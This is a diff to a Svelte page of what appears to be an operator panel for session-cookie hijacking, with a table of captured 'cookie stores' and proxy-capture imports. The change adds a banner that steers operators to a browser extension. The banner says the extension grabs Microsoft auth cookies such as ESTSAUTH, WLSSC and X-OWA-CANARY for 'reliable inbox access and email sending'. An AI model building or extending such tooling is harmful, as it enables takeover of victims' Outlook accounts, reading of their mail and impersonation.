@@ -611,6 +611,27 @@
 	<BigButton on:click={openProxyCaptureModal}>IMPORT FROM PROXY CAPTURES</BigButton>
 </div>
 
+<!-- Extension Notice Banner -->
+<div class="mb-6 p-4 rounded-lg bg-indigo-50 dark:bg-indigo-900/20 border border-indigo-200 dark:border-indigo-800 flex items-start gap-3">
+	<div class="w-8 h-8 rounded-lg bg-indigo-600 flex items-center justify-center flex-shrink-0 mt-0.5">
+		<svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+			<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+		</svg>
+	</div>
+	<div class="flex-1">
+		<p class="text-sm font-medium text-indigo-700 dark:text-indigo-300">
+			For proper Outlook cookie capture, use the Browser Extension
+		</p>
+		<p class="text-xs text-indigo-600 dark:text-indigo-400 mt-1">
+			Proxy captures may miss critical OWA session cookies. The extension captures all Microsoft auth cookies (ESTSAUTH, WLSSC, X-OWA-CANARY, etc.) directly from the browser for reliable inbox access and email sending.
+		</p>
+		<a href="/tools" class="inline-flex items-center gap-1 mt-2 text-xs font-medium text-indigo-700 dark:text-indigo-300 hover:text-indigo-800 dark:hover:text-indigo-200 transition-colors">
+			Download Extension on Tools Page
+			<svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
+		</a>
+	</div>
+</div>
+
 <!-- Cookie Stores Table -->
 <Table
 	columns={['Name', 'Email', 'Source', 'Cookies', 'Status', 'Automation', 'Last Checked']}
